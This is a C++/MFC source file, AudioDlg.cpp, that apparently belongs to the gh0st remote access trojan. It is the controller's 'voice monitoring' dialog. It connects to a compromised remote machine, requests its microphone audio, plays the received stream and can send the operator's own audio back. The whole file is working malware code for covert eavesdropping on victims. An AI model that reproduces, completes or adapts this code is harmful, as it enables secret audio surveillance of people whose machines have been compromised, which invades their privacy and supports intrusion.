// AudioDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "AudioDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAudioDlg dialog

CAudioDlg::CAudioDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CAudioDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CAudioDlg)
	m_bIsSendLocalAudio = FALSE;
	//}}AFX_DATA_INIT

	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_AUDIO));
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_bIsWorking	= true;

	m_nTotalRecvBytes = 0;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
}


void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAudioDlg)
	DDX_Check(pDX, IDC_SEND_LOCALAUDIO, m_bIsSendLocalAudio);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	//{{AFX_MSG_MAP(CAudioDlg)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_SEND_LOCALAUDIO, OnSendLocalaudio)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CAudioDlg message handlers


BOOL CAudioDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	
	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	str.Format("\\\\%s - 语音监听", m_IPAddress);
	SetWindowText(str);

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);
	return true;
}

void CAudioDlg::OnReceiveComplete()
{
	m_nTotalRecvBytes += m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	CString	str;
 	str.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIPS, str);
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUDIO_DATA:
		m_Audio.playBuffer(m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	default:
		// 传输发生异常数据
		return;
	}	
}

void CAudioDlg::OnReceive()
{
	
}

void CAudioDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	
	closesocket(m_pContext->m_Socket);

	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CDialog::OnClose();
}

void CAudioDlg::OnSendLocalaudio() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
}

// 负责发送本地语音
DWORD WINAPI CAudioDlg::WorkThread(LPVOID lparam)
{
	CAudioDlg	*pThis = (CAudioDlg *)lparam;

	while (pThis->m_bIsWorking)
	{
		if (!pThis->m_bIsSendLocalAudio)
		{
			Sleep(1000);
			continue;
		}
		DWORD	dwBytes = 0;
		LPBYTE	lpBuffer = pThis->m_Audio.getRecordBuffer(&dwBytes);
		if (lpBuffer != NULL && dwBytes > 0)
			pThis->m_iocpServer->Send(pThis->m_pContext, lpBuffer, dwBytes);
	}
	return 0;
}